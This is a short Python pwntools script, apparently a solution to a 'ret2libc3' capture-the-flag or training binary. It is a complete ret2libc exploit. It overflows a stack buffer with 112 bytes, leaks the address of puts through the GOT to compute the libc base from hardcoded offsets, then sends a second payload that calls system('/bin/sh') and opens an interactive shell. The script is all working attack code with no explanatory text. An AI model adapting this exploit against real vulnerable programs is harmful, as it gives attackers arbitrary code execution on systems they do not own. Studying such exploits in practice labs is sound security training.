from pwn import *

p = process('./ret2libc3')
elf = ELF('./ret2libc3')

puts_got_addr = elf.got['puts']
puts_plt_addr = elf.plt['puts']
main_plt_addr = elf.symbols['_start']

print ("puts_got_addr = ",hex(puts_got_addr))
print ("puts_plt_addr = ",hex(puts_plt_addr))
print( "main_plt_addr = ",hex(main_plt_addr))

payload = b'a'*112+p32(puts_plt_addr)+p32(main_plt_addr)+p32(puts_got_addr)
p.recv()
p.sendline(payload)

puts_addr = u32(p.recv()[0:4])
print ("puts_addr = ",hex(puts_addr))
sys_offset = 0x41780
puts_offset = 0x6dc40
sh_offset = 0x18e363

libc_base_addr = puts_addr - puts_offset
sys_addr = libc_base_addr + sys_offset
sh_addr = libc_base_addr + sh_offset

print ("libc_base_addr = ",hex(libc_base_addr))
print ("sys_addr = ",hex(sys_addr))
print ("sh_addr = ",hex(sh_addr))

payload = b'A'*112+ p32(sys_addr)+b"AAAA"+p32(sh_addr)

p.sendline(payload)
p.interactive()
